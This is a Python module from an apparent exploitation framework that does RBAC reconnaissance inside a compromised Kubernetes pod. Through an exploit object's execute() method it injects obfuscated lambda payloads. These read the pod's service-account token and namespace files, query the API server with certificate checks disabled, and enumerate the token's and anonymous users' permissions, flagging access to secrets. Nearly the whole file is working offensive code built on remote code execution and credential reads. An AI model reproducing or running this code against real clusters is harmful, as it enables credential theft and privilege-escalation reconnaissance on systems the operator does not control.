import json

def run(exploit, *args):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    
    # 1. Identity Discovery (Who am I?)
    try:
        who_payload = (
            "(lambda conn: (conn.request('POST', '/apis/authentication.k8s.io/v1/selfsubjectreviews', "
            "body='{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"SelfSubjectReview\"}', "
            "headers={'Authorization': 'Bearer ' + open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip(), 'Content-Type': 'application/json'}), "
            "conn.getresponse().read().decode())[1])(__import__('http.client').client.HTTPSConnection('kubernetes.default', "
            "context=__import__('ssl')._create_unverified_context()))"
        )
        current_user = json.loads(exploit.execute(who_payload)).get('status', {}).get('userInfo', {}).get('username', 'Unknown-SA')
    except:
        current_user = "Unknown-SA"

    # 2. Namespace Discovery
    try:
        local_ns = exploit.execute("open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read().strip()")
    except:
        local_ns = "default"

    # 3. Define Targets: The Authenticated SA and the Anonymous User
    targets = [
        {"name": current_user, "token": "open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()", "color": C, "type": "AUTH"},
        {"name": "system:anonymous", "token": "None", "color": Y, "type": "ANON"}
    ]

    print(f"\n{B}[ K8S DYNAMIC RBAC RECON ]{N}")
    print(f"{B}{'IDENTITY':<70} {'SCOPE':<15} {'RESOURCE':<15} {'VERBS'}{N}")
    print("-" * 120)

    findings = []
    seen_keys = set() 

    for target in targets:
        # Check both Global (Cluster-wide) and Local (Namespace) scopes
        for scope_label, ns_val in [("Global", "''"), (f"NS:{local_ns}", f"'{local_ns}'")]:
            # The payload logic: If token is 'None', we don't send the Authorization header
            payload = (
                f"(lambda ns, token: (lambda conn: (lambda headers: ("
                f"conn.request('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', "
                f"body='{{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{{\"namespace\":\"' + ns + '\"}}}}', "
                f"headers=headers), "
                f"conn.getresponse().read().decode())[1])"
                f"({{'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token}} if token else {{'Content-Type': 'application/json'}}))"
                f"(__import__('http.client').client.HTTPSConnection('kubernetes.default', context=__import__('ssl')._create_unverified_context())))"
                f"({ns_val}, {target['token']})"
            )

            try:
                res = exploit.execute(payload)
                data = json.loads(res)
                rules = data.get('status', {}).get('resourceRules', [])

                for rule in rules:
                    verbs = ",".join(sorted(rule.get('verbs', [])))
                    resources = ",".join(sorted(rule.get('resources', [])))
                    
                    # Skip noise and ensure we only track unique findings
                    if not verbs or "selfsubject" in resources:
                        continue
                    
                    unique_key = f"{target['name']}-{scope_label}-{resources}-{verbs}"
                    if unique_key not in seen_keys:
                        print(f" {target['color']}{target['name']:<70} {N}{scope_label:<15} {resources:<15} {verbs}")
                        findings.append({"id": target['name'], "scope": scope_label, "res": resources, "verbs": verbs, "type": target['type']})
                        seen_keys.add(unique_key)
            except:
                continue

    # 4. Forensic Analysis (Unique alerts only)
    if findings:
        print(f"\n{C}--- FORENSIC ANALYSIS ---{N}")
        alerts = set()
        for f in findings:
            if "secrets" in f['res'] or "*" in f['res']:
                risk = f"{R}CRITICAL{N}" if f['scope'] == "Global" or f['type'] == "ANON" else f"{Y}WARNING{N}"
                msg = f" [{risk[5:6]}!] {risk}: {f['id']} has {B}{f['scope']}{N} access to {Y}{f['res']}{N}."
                if msg not in alerts:
                    print(msg)
                    alerts.add(msg)
        print("-" * 35)
    else:
        print(f"\n {G}●{N} No administrative permissions found.")

    print(f"\n{B}[ Operation Complete ]{N}\n")